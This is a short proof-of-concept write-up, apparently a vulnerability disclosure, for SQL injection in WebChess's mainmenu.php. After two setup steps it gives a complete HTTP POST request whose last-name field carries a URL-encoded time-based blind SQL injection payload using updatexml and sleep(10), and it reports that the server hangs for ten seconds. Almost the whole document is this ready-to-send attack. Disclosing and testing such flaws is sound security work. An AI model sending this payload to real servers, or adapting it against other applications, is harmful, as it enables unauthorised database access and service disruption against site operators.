# webchess_sqli_poc

1. register 1 new user with password:123
2. login as the new user
3. send the following malicious packet

POST /webchess/mainmenu.php HTTP/1.1

Host: 127.0.0.1

Content-Length: 216

Cache-Control: max-age=0

sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: http://127.0.0.1

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: http://127.0.0.1/webchess/mainmenu.php

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: PHPSESSID=0h36rka0b1ijafmi9enqn3cjat

Connection: close



txtFirstName=test11&txtLastName=%27+or+updatexml%280%2Cconcat%280x7e%2C%28select+*+from+%28select%28sleep%2810%29%29%29a%29%29%2C0%29+or+%27&pwdOldPassword=123&pwdPassword=123&pwdPassword2=123&ToDo=UpdatePersonalInfo

4. The server will be hanged for 10s
